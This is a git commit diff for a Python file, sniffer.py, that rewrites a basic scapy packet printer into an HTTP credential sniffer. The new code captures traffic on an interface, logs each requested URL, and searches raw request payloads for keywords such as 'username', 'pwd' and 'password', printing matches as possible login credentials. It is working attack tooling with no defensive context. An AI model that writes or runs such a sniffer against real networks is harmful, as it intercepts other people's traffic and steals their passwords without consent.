29aa97c984da7c2605c32d53dc77f2cb833568b0
Bhavishya Tyagi <31559206+HanuTyagi@users.noreply.github.com>
2023-01-25 11:43:29 +0530

    Update sniffer.py

--- sniffer.py
+++ sniffer.py
@@ -1,6 +1,33 @@
-from scapy.all import *
+import scapy.all as scapy
 
-def packet_callback(packet):
-    print(packet.show())
+from scapy.layers import http
 
-sniff(prn=packet_callback)
+def sniff(interface):
+    scapy.sniff(prn=process_sniffed_packets)
+
+def get_url(packet):
+    if packet.haslayer(http.HTTPRequest):
+        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+        return url
+
+def get_login_info(packet):
+    if packet.haslayer(http.HTTPRequest):
+        if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw].load
+            #load = str(load)
+            keybword = ["usr", "uname", "username", "pwd", "pass", "password"]
+            for eachword in keybword:
+                if eachword.encode() in load:
+                    return load
+
+
+def process_sniffed_packets(packet):
+    if packet.haslayer(http.HTTPRequest):
+        url = get_url(packet)
+        print("[+] HTTP Request>>" + str(url))
+
+        login_info = get_login_info(packet)
+        if login_info:
+            print("\n\n[+] Possible username and password >>" + str(login_info) + "\n\n")
+
+sniff('eth0')
